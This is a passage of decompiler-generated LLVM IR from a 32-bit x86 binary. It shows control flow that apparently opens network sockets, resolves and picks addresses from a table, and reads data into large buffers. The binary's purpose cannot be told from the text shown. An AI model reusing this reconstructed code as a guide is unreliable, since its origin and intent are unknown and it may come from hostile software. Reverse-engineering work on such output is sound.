  %v1_804fe8d = add i32 %v0_804fe8d, 4
  %v2_804fe8d = inttoptr i32 %v1_804fe8d to i32*
  %v3_804fe8d = load i32, i32* %v2_804fe8d, align 4
  %v2_804fe90 = add i32 %v0_804fe81, -16
  %v3_804fe90 = inttoptr i32 %v2_804fe90 to i32*
  store i32 %v3_804fe8d, i32* %v3_804fe90, align 4
  %v0_804fe91 = call i32 @function_8051c16()
  store i32 %v0_804fe91, i32* %eax.global-to-local, align 4
  %v0_804fe99 = load i32, i32* @edi, align 4
  %v1_804fe99 = add i32 %v0_804fe99, 12
  %v2_804fe99 = inttoptr i32 %v1_804fe99 to i32*
  store i32 5, i32* %v2_804fe99, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804fea5:                             ; preds = %dec_label_pc_804fdec
  %v0_804fea5 = load i32, i32* @esp, align 4
  %v1_804fea8 = add i32 %v0_804fea5, -16
  %v2_804fea8 = inttoptr i32 %v1_804fea8 to i32*
  store i32 25, i32* %v2_804fea8, align 4
  %v0_804feaa = call i32 @function_8050970()
  store i32 %v0_804feaa, i32* %eax.global-to-local, align 4
  %v0_804feaf = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fe5b

dec_label_pc_804feb4:                             ; preds = %dec_label_pc_804fa25
  store i32 9, i32* %v1_804febe, align 4
  %v0_804fec5 = call i32 @function_80509f0()
  store i32 %v0_804fec5, i32* %eax.global-to-local, align 4
  %v0_804feca = load i32, i32* @esp, align 4
  %v1_804feca = inttoptr i32 %v0_804feca to i32*
  %v3_804feca = add i32 %v0_804feca, 4
  %v1_804fecb = inttoptr i32 %v3_804feca to i32*
  %v2_804fecb = load i32, i32* %v1_804fecb, align 4
  store i32 %v2_804fecb, i32* %eax.global-to-local, align 4
  %v1_804fecc = add i32 %v0_804feca, 1944
  store i32 %v1_804fecc, i32* %edx.global-to-local, align 4
  store i32 %v1_804fecc, i32* %v1_804fecb, align 4
  store i32 9, i32* %v1_804feca, align 4
  %v0_804fed6 = call i32 @function_8050940()
  store i32 %v0_804fed6, i32* %eax.global-to-local, align 4
  %v0_804fedb = load i32, i32* @esp, align 4
  %v1_804fedb = add i32 %v0_804fedb, 1944
  %v2_804fedb = inttoptr i32 %v1_804fedb to i32*
  %v3_804fedb = load i32, i32* %v2_804fedb, align 4
  %v1_804fee2 = add i32 %v3_804fedb, -1
  store i32 %v1_804fee2, i32* %edx.global-to-local, align 4
  %v2_804fee3 = add i32 %v0_804fedb, -4
  %v3_804fee3 = inttoptr i32 %v2_804fee3 to i32*
  store i32 %v1_804fee2, i32* %v3_804fee3, align 4
  %v2_804fee4 = add i32 %v0_804fedb, -8
  %v3_804fee4 = inttoptr i32 %v2_804fee4 to i32*
  store i32 %v0_804fed6, i32* %v3_804fee4, align 4
  %v0_804fee5 = load i32, i32* @edi, align 4
  %v1_804fee5 = add i32 %v0_804fee5, 24
  %v2_804fee5 = inttoptr i32 %v1_804fee5 to i32*
  %v3_804fee5 = load i32, i32* %v2_804fee5, align 4
  store i32 %v3_804fee5, i32* @esi, align 4
  %v2_804fee8 = add i32 %v0_804fedb, -12
  %v3_804fee8 = inttoptr i32 %v2_804fee8 to i32*
  store i32 %v3_804fee5, i32* %v3_804fee8, align 4
  %v1_804fee9 = add i32 %v0_804fedb, 36
  %v2_804fee9 = inttoptr i32 %v1_804fee9 to i32*
  %v3_804fee9 = load i32, i32* %v2_804fee9, align 4
  store i32 %v3_804fee9, i32* @ebx, align 4
  %v2_804feed = add i32 %v0_804fedb, -16
  %v3_804feed = inttoptr i32 %v2_804feed to i32*
  store i32 %v3_804fee9, i32* %v3_804feed, align 4
  %v0_804feee = call i32 @function_8051070()
  store i32 %v0_804feee, i32* %eax.global-to-local, align 4
  %v1_804fef3 = load i32, i32* @esp, align 4
  %v2_804fef3 = add i32 %v1_804fef3, 68
  %v3_804fef3 = inttoptr i32 %v2_804fef3 to i32*
  store i32 %v0_804feee, i32* %v3_804fef3, align 4
  %v0_804fef7 = load i32, i32* @esp, align 4
  %v1_804fefa = add i32 %v0_804fef7, 16
  %v2_804fefa = inttoptr i32 %v1_804fefa to i32*
  store i32 9, i32* %v2_804fefa, align 4
  %v0_804fefc = call i32 @function_8050970()
  store i32 %v0_804fefc, i32* %eax.global-to-local, align 4
  %v0_804ff01 = load i32, i32* @esp, align 4
  %v1_804ff04 = add i32 %v0_804ff01, 52
  %v2_804ff04 = inttoptr i32 %v1_804ff04 to i32*
  %v3_804ff04 = load i32, i32* %v2_804ff04, align 4
  %v13_804ff04 = icmp eq i32 %v3_804ff04, -1
  br i1 %v13_804ff04, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804ff0f

dec_label_pc_804ff0f:                             ; preds = %dec_label_pc_804feb4
  %v1_804ff01 = add i32 %v0_804ff01, 16
  store i32 %v3_804ff04, i32* %ecx.global-to-local, align 4
  %tmp161 = icmp slt i32 %v3_804ff04, 1
  br i1 %tmp161, label %dec_label_pc_804fb29, label %dec_label_pc_804ff1b

dec_label_pc_804ff1b:                             ; preds = %dec_label_pc_804ff0f
  %v0_804ff1b = load i32, i32* @edi, align 4
  %v1_804ff1b = inttoptr i32 %v0_804ff1b to i32*
  %v2_804ff1b = load i32, i32* %v1_804ff1b, align 4
  store i32 %v2_804ff1b, i32* %ecx.global-to-local, align 4
  %v1_804ff1d = add i32 %v0_804ff1b, 20
  %v2_804ff1d = inttoptr i32 %v1_804ff1d to i32*
  %v3_804ff1d = load i32, i32* %v2_804ff1d, align 4
  store i32 %v3_804ff1d, i32* %edx.global-to-local, align 4
  %v1_804ff20 = add i32 %v0_804ff1b, 16
  %v2_804ff20 = inttoptr i32 %v1_804ff20 to i32*
  %v3_804ff20 = load i32, i32* %v2_804ff20, align 4
  store i32 %v3_804ff20, i32* %eax.global-to-local, align 4
  %v2_804ff23 = add i32 %v0_804ff01, 116
  %v3_804ff23 = inttoptr i32 %v2_804ff23 to i32*
  store i32 %v2_804ff1b, i32* %v3_804ff23, align 4
  %v0_804ff27 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ff27 = load i32, i32* @esp, align 4
  %v2_804ff27 = add i32 %v1_804ff27, 1936
  %v3_804ff27 = inttoptr i32 %v2_804ff27 to i32*
  store i32 %v0_804ff27, i32* %v3_804ff27, align 4
  %v0_804ff2e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ff2e = trunc i32 %v0_804ff2e to i16
  %v2_804ff2e = load i32, i32* @esp, align 4
  %v3_804ff2e = add i32 %v2_804ff2e, 1946
  %v4_804ff2e = inttoptr i32 %v3_804ff2e to i16*
  store i16 %v1_804ff2e, i16* %v4_804ff2e, align 2
  %v0_804ff36 = call i32 @function_8051511()
  store i32 %v0_804ff36, i32* %eax.global-to-local, align 4
  %tmp162 = icmp slt i32 %v0_804ff36, 1
  br i1 %tmp162, label %dec_label_pc_80500a6, label %dec_label_pc_804ff43

dec_label_pc_804ff43:                             ; preds = %dec_label_pc_80500a6, %dec_label_pc_804ff1b, %dec_label_pc_8050210, %dec_label_pc_8050155
  %v0_804ff43 = load i32, i32* @esp, align 4
  %v0_804ff46 = load i32, i32* @edi, align 4
  %v1_804ff46 = add i32 %v0_804ff46, 4
  %v2_804ff46 = inttoptr i32 %v1_804ff46 to i32*
  %v3_804ff46 = load i32, i32* %v2_804ff46, align 4
  store i32 %v3_804ff46, i32* %eax.global-to-local, align 4
  %v2_804ff49 = add i32 %v0_804ff43, -16
  %v3_804ff49 = inttoptr i32 %v2_804ff49 to i32*
  store i32 %v3_804ff46, i32* %v3_804ff49, align 4
  %v1_804ff4a = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ff4a, i32* %eax.global-to-local, align 4
  %v0_804ff52 = load i32, i32* @edi, align 4
  %v1_804ff52 = add i32 %v0_804ff52, 4
  %v2_804ff52 = inttoptr i32 %v1_804ff52 to i32*
  store i32 -1, i32* %v2_804ff52, align 4
  %v0_804ff59 = load i32, i32* @edi, align 4
  %v1_804ff59 = add i32 %v0_804ff59, 12
  %v2_804ff59 = inttoptr i32 %v1_804ff59 to i32*
  store i32 0, i32* %v2_804ff59, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804ff65:                             ; preds = %dec_label_pc_804f6cf
  %v0_804ff65 = load i32, i32* @esp, align 4
  %v1_804ff68 = add i32 %v0_804ff65, -16
  %v2_804ff68 = inttoptr i32 %v1_804ff68 to i32*
  store i32 26, i32* %v2_804ff68, align 4
  %v0_804ff6a = call i32 @function_8050970()
  store i32 %v0_804ff6a, i32* %eax.global-to-local, align 4
  %v0_804ff6f = load i32, i32* @esp, align 4
  %v1_804ff6f = inttoptr i32 %v0_804ff6f to i32*
  store i32 27, i32* %v1_804ff6f, align 4
  %v0_804ff76 = call i32 @function_8050970()
  store i32 %v0_804ff76, i32* %eax.global-to-local, align 4
  %v0_804ff7b = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f797

dec_label_pc_804ff83:                             ; preds = %dec_label_pc_804fa62
  store i32 %v0_804ff83, i32* @eax, align 4
  %v0_804ff85 = call i32 @function_804dcd0()
  store i32 %v0_804ff85, i32* %eax.global-to-local, align 4
  %v0_804ff8a = load i32, i32* @esp, align 4
  %v1_804ff8a = add i32 %v0_804ff8a, 36
  %v2_804ff8a = inttoptr i32 %v1_804ff8a to i32*
  store i32 -1, i32* %v2_804ff8a, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804ff97:                             ; preds = %dec_label_pc_804fbcb
  %v1_804ff97 = add i32 %v0_804fbb7, 36
  %v2_804ff97 = inttoptr i32 %v1_804ff97 to i32*
  %v3_804ff97 = load i32, i32* %v2_804ff97, align 4
  %v1_804ff9b = add i32 %v0_804fbbe, 3
  store i32 %v1_804ff9b, i32* @ebx, align 4
  %v1_804ff9e = add i32 %v3_804ff97, 3
  store i32 %v1_804ff9e, i32* %eax.global-to-local, align 4
  store i32 %v1_804ff9e, i32* %v2_804ff97, align 4
  %v0_804ffa5 = load i32, i32* @esp, align 4
  %v1_804ffa5 = add i32 %v0_804ffa5, -4
  %v2_804ffa5 = inttoptr i32 %v1_804ffa5 to i32*
  store i32 16384, i32* %v2_804ffa5, align 4
  %v1_804ffaa = add i32 %v0_804ffa5, -8
  %v2_804ffaa = inttoptr i32 %v1_804ffaa to i32*
  store i32 3, i32* %v2_804ffaa, align 4
  %v1_804ffac = add i32 %v0_804ffa5, 1943
  store i32 %v1_804ffac, i32* %ecx.global-to-local, align 4
  %v2_804ffb3 = add i32 %v0_804ffa5, -12
  %v3_804ffb3 = inttoptr i32 %v2_804ffb3 to i32*
  store i32 %v1_804ffac, i32* %v3_804ffb3, align 4
  %v0_804ffb4 = load i32, i32* @edi, align 4
  %v1_804ffb4 = add i32 %v0_804ffb4, 4
  %v2_804ffb4 = inttoptr i32 %v1_804ffb4 to i32*
  %v3_804ffb4 = load i32, i32* %v2_804ffb4, align 4
  store i32 %v3_804ffb4, i32* %eax.global-to-local, align 4
  %v2_804ffb7 = add i32 %v0_804ffa5, -16
  %v3_804ffb7 = inttoptr i32 %v2_804ffb7 to i32*
  store i32 %v3_804ffb4, i32* %v3_804ffb7, align 4
  %v0_804ffb8 = call i32 @function_8051c16()
  %v0_804ffbd = load i32, i32* @esp, align 4
  %v1_804ffbd = add i32 %v0_804ffbd, -4
  %v2_804ffbd = inttoptr i32 %v1_804ffbd to i32*
  store i32 16384, i32* %v2_804ffbd, align 4
  %v1_804ffc2 = add i32 %v0_804ffbd, -8
  %v2_804ffc2 = inttoptr i32 %v1_804ffc2 to i32*
  store i32 9, i32* %v2_804ffc2, align 4
  %v1_804ffc4 = add i32 %v0_804ffbd, 1927
  store i32 %v1_804ffc4, i32* %eax.global-to-local, align 4
  %v2_804ffcb = add i32 %v0_804ffbd, -12
  %v3_804ffcb = inttoptr i32 %v2_804ffcb to i32*
  store i32 %v1_804ffc4, i32* %v3_804ffcb, align 4
  %v0_804ffcc = load i32, i32* @edi, align 4
  %v1_804ffcc = add i32 %v0_804ffcc, 4
  %v2_804ffcc = inttoptr i32 %v1_804ffcc to i32*
  %v3_804ffcc = load i32, i32* %v2_804ffcc, align 4
  store i32 %v3_804ffcc, i32* %eax.global-to-local, align 4
  %v2_804ffcf = add i32 %v0_804ffbd, -16
  %v3_804ffcf = inttoptr i32 %v2_804ffcf to i32*
  store i32 %v3_804ffcc, i32* %v3_804ffcf, align 4
  %v0_804ffd0 = call i32 @function_8051c16()
  store i32 %v0_804ffd0, i32* %eax.global-to-local, align 4
  %v0_804ffd5 = load i32, i32* @esp, align 4
  %v1_804ffd5 = add i32 %v0_804ffd5, 32
  %v0_804ffd8 = load i32, i32* @edi, align 4
  %v1_804ffd8 = add i32 %v0_804ffd8, 24
  %v2_804ffd8 = inttoptr i32 %v1_804ffd8 to i32*
  %v3_804ffd8 = load i32, i32* %v2_804ffd8, align 4
  store i32 %v3_804ffd8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f5ff.backedge

dec_label_pc_804ffe0:                             ; preds = %dec_label_pc_804f540, %dec_label_pc_804f50a
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ffe2

dec_label_pc_804ffe2:                             ; preds = %dec_label_pc_804f552, %dec_label_pc_804ffe0
  %v0_804ffe5 = phi i32 [ 0, %dec_label_pc_804ffe0 ], [ %v0_804f541, %dec_label_pc_804f552 ]
  %v0_804ffe2 = load i32, i32* @edi, align 4
  %v1_804ffe2 = add i32 %v0_804ffe2, 4
  %v2_804ffe2 = inttoptr i32 %v1_804ffe2 to i32*
  %v3_804ffe2 = load i32, i32* %v2_804ffe2, align 4
  store i32 %v3_804ffe2, i32* %ecx.global-to-local, align 4
  %v2_804ffe5 = inttoptr i32 %v0_804ffe2 to i32*
  store i32 %v0_804ffe5, i32* %v2_804ffe5, align 4
  %v0_804ffe7 = load i32, i32* @edi, align 4
  %v1_804ffe7 = add i32 %v0_804ffe7, 24
  %v2_804ffe7 = inttoptr i32 %v1_804ffe7 to i32*
  store i32 0, i32* %v2_804ffe7, align 4
  %v0_804f460.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804f468.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f460

dec_label_pc_804fff3:                             ; preds = %dec_label_pc_804fbd5
  %v11_804fff3 = icmp eq i8 %v2_804fbd5, -5
  %v1_804fff5 = icmp eq i1 %v11_804fff3, false
  br i1 %v1_804fff5, label %dec_label_pc_804f631, label %dec_label_pc_804fffb

dec_label_pc_804fffb:                             ; preds = %dec_label_pc_804fff3
  store i8 -3, i8* %v1_804fbd5, align 1
  br label %dec_label_pc_804f631

dec_label_pc_8050003:                             ; preds = %dec_label_pc_804f0b1
  %v0_8050003 = load i32, i32* @ebx, align 4
  %v1_8050003 = trunc i32 %v0_8050003 to i8
  %v10_8050003 = icmp eq i8 %v1_8050003, 46
  %v1_8050006 = icmp eq i1 %v10_8050003, false
  br i1 %v1_8050006, label %dec_label_pc_804f0c3, label %dec_label_pc_804e2d1

dec_label_pc_8050011:                             ; preds = %dec_label_pc_804f086
  %v0_8050011 = load i32, i32* @ebx, align 4
  %v1_8050011 = trunc i32 %v0_8050011 to i8
  %v11_8050011 = icmp eq i8 %v1_8050011, -92
  %v1_8050014 = icmp eq i1 %v11_8050011, false
  br i1 %v1_8050014, label %dec_label_pc_804f09f, label %dec_label_pc_804e2d1

dec_label_pc_805001f:                             ; preds = %dec_label_pc_804f049
  %v0_805001f = load i32, i32* @ebx, align 4
  %v1_805001f = trunc i32 %v0_805001f to i8
  %tmp772 = icmp ugt i8 %v1_805001f, 96
  %v1_805001f.off = add i8 %v1_805001f, -97
  %tmp773 = icmp ult i8 %v1_805001f.off, 2
  %or.cond253 = and i1 %tmp772, %tmp773
  br i1 %or.cond253, label %dec_label_pc_804e2d1, label %dec_label_pc_804f08f.thread

dec_label_pc_8050036:                             ; preds = %dec_label_pc_804f08f
  %v0_8050036 = load i32, i32* @ebx, align 4
  %v1_8050036 = trunc i32 %v0_8050036 to i8
  %tmp774 = icmp ult i8 %v1_8050036, 108
  br i1 %tmp774, label %dec_label_pc_804e2d1, label %dec_label_pc_804f09f

dec_label_pc_8050044:                             ; preds = %dec_label_pc_804f4c4
  %v0_8050047 = load i32, i32* @edi, align 4
  %v1_8050047 = add i32 %v0_8050047, 4
  %v2_8050047 = inttoptr i32 %v1_8050047 to i32*
  %v3_8050047 = load i32, i32* %v2_8050047, align 4
  store i32 %v3_8050047, i32* %eax.global-to-local, align 4
  %v2_805004a = add i32 %v0_804f4fa, 16
  %v3_805004a = inttoptr i32 %v2_805004a to i32*
  store i32 %v3_8050047, i32* %v3_805004a, align 4
  %v1_805004b = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805004b, i32* %eax.global-to-local, align 4
  %v0_8050053 = load i32, i32* @edi, align 4
  %v1_8050053 = add i32 %v0_8050053, 4
  %v2_8050053 = inttoptr i32 %v1_8050053 to i32*
  store i32 -1, i32* %v2_8050053, align 4
  %v0_805005a = load i32, i32* @edi, align 4
  %v1_805005a = add i32 %v0_805005a, 284
  %v2_805005a = inttoptr i32 %v1_805005a to i8*
  store i8 0, i8* %v2_805005a, align 1
  %v0_8050061 = load i32, i32* @edi, align 4
  %v1_8050061 = add i32 %v0_8050061, 12
  %v2_8050061 = inttoptr i32 %v1_8050061 to i32*
  store i32 0, i32* %v2_8050061, align 4
  br label %dec_label_pc_804f47b

dec_label_pc_805006d:                             ; preds = %dec_label_pc_804fbe7
  %v1_805006d = add i32 %v0_804f5b3, 120
  %v2_805006d = inttoptr i32 %v1_805006d to i32*
  %v3_805006d = load i32, i32* %v2_805006d, align 4
  store i32 %v3_805006d, i32* %eax.global-to-local, align 4
  %v1_8050071 = inttoptr i32 %v3_805006d to i32*
  store i32 104, i32* %v1_8050071, align 4
  %v0_804fc03.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fc03

dec_label_pc_805007c:                             ; preds = %dec_label_pc_804fc03
  store i32 %v0_805007c, i32* @eax, align 4
  %v0_805007e = call i32 @function_804dcd0()
  store i32 %v0_805007e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f47b

dec_label_pc_8050088:                             ; preds = %dec_label_pc_804f743
  %v0_8050088 = load i32, i32* @esp, align 4
  %v1_805008b = add i32 %v0_8050088, -16
  %v2_805008b = inttoptr i32 %v1_805008b to i32*
  store i32 26, i32* %v2_805008b, align 4
  %v0_805008d = call i32 @function_8050970()
  store i32 %v0_805008d, i32* %eax.global-to-local, align 4
  %v0_8050092 = load i32, i32* @esp, align 4
  %v1_8050092 = inttoptr i32 %v0_8050092 to i32*
  store i32 27, i32* %v1_8050092, align 4
  %v0_8050099 = call i32 @function_8050970()
  store i32 %v0_8050099, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f56a.backedge

dec_label_pc_804f56a.backedge:                    ; preds = %dec_label_pc_804fdf8, %dec_label_pc_804fb29, %dec_label_pc_804f5e0, %dec_label_pc_804fe43, %dec_label_pc_804feb4, %dec_label_pc_804fcf2, %dec_label_pc_804f9e0, %dec_label_pc_804fc75, %dec_label_pc_804f99b, %dec_label_pc_804f91e, %dec_label_pc_804f8e0, %dec_label_pc_804f863, %dec_label_pc_804f825, %dec_label_pc_804fd6f, %dec_label_pc_804f7e0, %dec_label_pc_804f773, %dec_label_pc_804f9d8, %dec_label_pc_804fa1d, %dec_label_pc_804f909, %dec_label_pc_804f84e, %dec_label_pc_804f81d, %dec_label_pc_8050088
  %v0_804f56a = load i32, i32* @edi, align 4
  %v1_804f56a = add i32 %v0_804f56a, 12
  %v2_804f56a = inttoptr i32 %v1_804f56a to i32*
  %v3_804f56a = load i32, i32* %v2_804f56a, align 4
  store i32 %v3_804f56a, i32* %eax.global-to-local, align 4
  %v1_804f56d = icmp eq i32 %v3_804f56a, 0
  br i1 %v1_804f56d, label %dec_label_pc_804f47b, label %dec_label_pc_804f56a.backedge.dec_label_pc_804f575_crit_edge

dec_label_pc_804f56a.backedge.dec_label_pc_804f575_crit_edge: ; preds = %dec_label_pc_804f56a.backedge
  %v1_804f578.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f575

dec_label_pc_80500a6:                             ; preds = %dec_label_pc_804ff1b
  %v1_80500a6 = add i32 %v0_804ff36, 1
  %v8_80500a6 = icmp eq i32 %v1_80500a6, 0
  store i32 %v1_80500a6, i32* %eax.global-to-local, align 4
  br i1 %v8_80500a6, label %dec_label_pc_804ff43, label %dec_label_pc_80500ad

dec_label_pc_80500ad:                             ; preds = %dec_label_pc_80500a6
  %v0_80500ad = load i32, i32* @ecx, align 4
  %v1_80500ad = load i32, i32* @esp, align 4
  %v2_80500ad = add i32 %v1_80500ad, -4
  %v3_80500ad = inttoptr i32 %v2_80500ad to i32*
  store i32 %v0_80500ad, i32* %v3_80500ad, align 4
  %v1_80500ae = add i32 %v1_80500ad, -8
  %v2_80500ae = inttoptr i32 %v1_80500ae to i32*
  store i32 0, i32* %v2_80500ae, align 4
  %v1_80500b0 = add i32 %v1_80500ad, -12
  %v2_80500b0 = inttoptr i32 %v1_80500b0 to i32*
  store i32 1, i32* %v2_80500b0, align 4
  %v1_80500b2 = add i32 %v1_80500ad, -16
  %v2_80500b2 = inttoptr i32 %v1_80500b2 to i32*
  store i32 2, i32* %v2_80500b2, align 4
  %v4_80500b4 = call i32 @function_8051cc7(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80500b4, i32* %eax.global-to-local, align 4
  %v0_80500b9 = load i32, i32* @esp, align 4
  %v1_80500b9 = inttoptr i32 %v0_80500b9 to i32*
  store i32 2, i32* %v1_80500b9, align 4
  store i32 %v4_80500b4, i32* @ebp, align 4
  %v0_80500c2 = call i32 @function_80509f0()
  store i32 %v0_80500c2, i32* %eax.global-to-local, align 4
  %v0_80500c7 = load i32, i32* @esp, align 4
  %v1_80500c7 = inttoptr i32 %v0_80500c7 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_8053dc2.26 to i32), i32* %v1_80500c7, align 4
  %v0_80500ce = call i32 @function_804d830()
  store i32 %v0_80500ce, i32* %eax.global-to-local, align 4
  %v0_80500d3 = load i32, i32* @esp, align 4
  store i32 %v0_80500ce, i32* @esi, align 4
  %v2_80500d8 = icmp eq i32 %v0_80500ce, 0
  %v1_8050210 = add i32 %v0_80500d3, 1908
  %v2_8050210 = inttoptr i32 %v1_8050210 to i16*
  store i16 2, i16* %v2_8050210, align 2
  br i1 %v2_80500d8, label %dec_label_pc_8050210, label %dec_label_pc_80500e0

dec_label_pc_80500e0:                             ; preds = %dec_label_pc_80500ad
  %v2_80500ea = add i32 %v0_80500ce, 4
  %v3_80500ea = inttoptr i32 %v2_80500ea to i32*
  %v4_80500ea = load i32, i32* %v3_80500ea, align 4
  store i32 %v4_80500ea, i32* @ebx, align 4
  %v1_80500ed = call i32 @function_804d5c0(i32 ptrtoint (i32* @0 to i32))
  %v2_80500ed = sext i32 %v1_80500ed to i64
  store i32 %v1_80500ed, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80500f4 = load i32, i32* @esi, align 4
  %v1_80500f4 = inttoptr i32 %v0_80500f4 to i8*
  %v2_80500f4 = load i8, i8* %v1_80500f4, align 1
  %v3_80500f4 = zext i8 %v2_80500f4 to i32
  store i32 %v3_80500f4, i32* %ecx.global-to-local, align 4
  %v8_80500fa = zext i8 %v2_80500f4 to i64
  %v9_80500fa = udiv i64 %v2_80500ed, %v8_80500fa
  %v10_80500fa = trunc i64 %v9_80500fa to i32
  store i32 %v10_80500fa, i32* %eax.global-to-local, align 4
  %v11_80500fa = urem i64 %v2_80500ed, %v8_80500fa
  %v12_80500fa = trunc i64 %v11_80500fa to i32
  store i32 %v12_80500fa, i32* %edx.global-to-local, align 4
  %v0_80500fc = load i32, i32* @ebx, align 4
  %v2_80500fc = mul nuw nsw i32 %v12_80500fa, 4
  %v3_80500fc = add i32 %v2_80500fc, %v0_80500fc
  %v4_80500fc = inttoptr i32 %v3_80500fc to i32*
  %v5_80500fc = load i32, i32* %v4_80500fc, align 4
  store i32 %v5_80500fc, i32* %eax.global-to-local, align 4
  %v1_80500ff = load i32, i32* @esp, align 4
  %v2_80500ff = add i32 %v1_80500ff, 1896
  %v3_80500ff = inttoptr i32 %v2_80500ff to i32*
  store i32 %v5_80500fc, i32* %v3_80500ff, align 4
  %v0_8050106 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050106 = load i32, i32* @esp, align 4
  %v2_8050106 = add i32 %v1_8050106, -4
  %v3_8050106 = inttoptr i32 %v2_8050106 to i32*
  store i32 %v0_8050106, i32* %v3_8050106, align 4
  %v0_8050107 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050107 = add i32 %v1_8050106, -8
  %v3_8050107 = inttoptr i32 %v2_8050107 to i32*
  store i32 %v0_8050107, i32* %v3_8050107, align 4
  %v1_8050108 = add i32 %v1_8050106, -12
  %v2_8050108 = inttoptr i32 %v1_8050108 to i32*
  store i32 0, i32* %v2_8050108, align 4
  %v1_805010a = add i32 %v1_8050106, -16
  %v2_805010a = inttoptr i32 %v1_805010a to i32*
  store i32 2, i32* %v2_805010a, align 4
  %v0_805010c = call i32 @function_8050940()
  %v1_805010c = inttoptr i32 %v0_805010c to i16*
  store i32 %v0_805010c, i32* %eax.global-to-local, align 4
  %v3_8050111 = load i16, i16* %v1_805010c, align 2
  %v4_8050111 = zext i16 %v3_8050111 to i32
  %v7_8050111 = and i32 %v0_805010c, -65536
  %v8_8050111 = or i32 %v4_8050111, %v7_8050111
  store i32 %v8_8050111, i32* %eax.global-to-local, align 4
  %v0_8050114 = load i32, i32* @esi, align 4
  %v1_8050114 = load i32, i32* @esp, align 4
  %v2_8050114 = inttoptr i32 %v1_8050114 to i32*
  store i32 %v0_8050114, i32* %v2_8050114, align 4
  %v0_8050117 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050117 = trunc i32 %v0_8050117 to i16
  %v2_8050117 = load i32, i32* @esp, align 4
  %v3_8050117 = add i32 %v2_8050117, 1910
  %v4_8050117 = inttoptr i32 %v3_8050117 to i16*
  store i16 %v1_8050117, i16* %v4_8050117, align 2
  %v0_805011f = call i32 @function_804d7f0()
  store i32 %v0_805011f, i32* %eax.global-to-local, align 4
  %v0_8050124 = load i32, i32* @esp, align 4
  %v1_8050124 = inttoptr i32 %v0_8050124 to i32*
  store i32 2, i32* %v1_8050124, align 4
  %v0_805012b = call i32 @function_8050970()
  %v0_8050130 = load i32, i32* @esp, align 4
  %v1_8050133 = add i32 %v0_8050130, 8
  %v2_8050133 = inttoptr i32 %v1_8050133 to i32*
  store i32 16, i32* %v2_8050133, align 4
  %v1_8050135 = add i32 %v0_8050130, 1908
  store i32 %v1_8050135, i32* %eax.global-to-local, align 4
  %v2_805013c = add i32 %v0_8050130, 4
  %v3_805013c = inttoptr i32 %v2_805013c to i32*
  store i32 %v1_8050135, i32* %v3_805013c, align 4
  %v0_805013d = load i32, i32* @ebp, align 4
  %v3_805013d = inttoptr i32 %v0_8050130 to i32*
  store i32 %v0_805013d, i32* %v3_805013d, align 4
  %v3_805013e = call i32 @function_8051aec(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8050143 = load i32, i32* @esp, align 4
  %v1_8050146 = add i32 %v3_805013e, 1
  %v8_8050146 = icmp eq i32 %v1_8050146, 0
  store i32 %v1_8050146, i32* %eax.global-to-local, align 4
  %v1_8050147 = icmp eq i1 %v8_8050146, false
  br i1 %v1_8050147, label %dec_label_pc_8050155, label %dec_label_pc_8050149

dec_label_pc_8050149:                             ; preds = %dec_label_pc_80500e0
  %v0_805014c = load i32, i32* @ebp, align 4
  %v3_805014c = inttoptr i32 %v0_8050143 to i32*
  store i32 %v0_805014c, i32* %v3_805014c, align 4
  %v1_805014d = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805014d, i32* %eax.global-to-local, align 4
  %v0_8050152 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050155

dec_label_pc_8050155:                             ; preds = %dec_label_pc_80500e0, %dec_label_pc_8050149
  %v0_8050155.in = phi i32 [ %v0_8050143, %dec_label_pc_80500e0 ], [ %v0_8050152, %dec_label_pc_8050149 ]
  %v1_8050155 = add i32 %v0_8050155.in, 1944
  %v2_8050155 = inttoptr i32 %v1_8050155 to i8*
  store i8 0, i8* %v2_8050155, align 1
  %v0_805015d = load i32, i32* @esp, align 4
  %v1_805015d = add i32 %v0_805015d, -4
  %v2_805015d = inttoptr i32 %v1_805015d to i32*
  store i32 16384, i32* %v2_805015d, align 4
  %v1_8050162 = add i32 %v0_805015d, -8
  %v2_8050162 = inttoptr i32 %v1_8050162 to i32*
  store i32 1, i32* %v2_8050162, align 4
  %v1_8050164 = add i32 %v0_805015d, 1928
  store i32 %v1_8050164, i32* %edx.global-to-local, align 4
  %v2_805016b = add i32 %v0_805015d, -12
  %v3_805016b = inttoptr i32 %v2_805016b to i32*
  store i32 %v1_8050164, i32* %v3_805016b, align 4
  %v0_805016c = load i32, i32* @ebp, align 4
  %v2_805016c = add i32 %v0_805015d, -16
  %v3_805016c = inttoptr i32 %v2_805016c to i32*
  store i32 %v0_805016c, i32* %v3_805016c, align 4
  %v0_805016d = call i32 @function_8051c16()
  store i32 %v0_805016d, i32* %eax.global-to-local, align 4
  %v0_8050172 = load i32, i32* @esp, align 4
  %v1_8050172 = add i32 %v0_8050172, -4
  %v2_8050172 = inttoptr i32 %v1_8050172 to i32*
